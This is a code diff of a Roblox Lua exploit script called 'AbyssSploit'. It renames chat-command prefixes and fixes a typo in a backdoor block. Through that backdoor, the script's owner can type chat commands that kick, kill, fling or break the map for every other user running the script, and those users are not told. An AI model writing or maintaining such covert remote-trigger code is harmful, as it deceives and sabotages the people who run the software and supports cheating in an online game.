@@ -5175,27 +5175,27 @@ task.spawn(function()
 
 		for i, v in next, PlayerService:GetPlayers() do
 			v.Chatted:Connect(function(Message)				
-				if Message:lower() == ";kick default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "!kick default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						LocalPlayer:Kick("Kicked by AbyssSploit owner")
 					end)
 				end
 
-				if Message:lower() == ";kill default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "!kill default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						KillHumanoid(0)
 					end)
 				end
 
-				if Message:lower() == ";lagback default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "!lag default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(99999, 99999, 99999)
 					end)
 				end
 
-				if Message:lower() == ";breakmap default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "!bm default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
-						for i, v in nt, CollionService:GetTagged("block") do
+						for i, v in next, CollectionService:GetTagged("block") do
 							v:Destroy()
 						end
 					end)
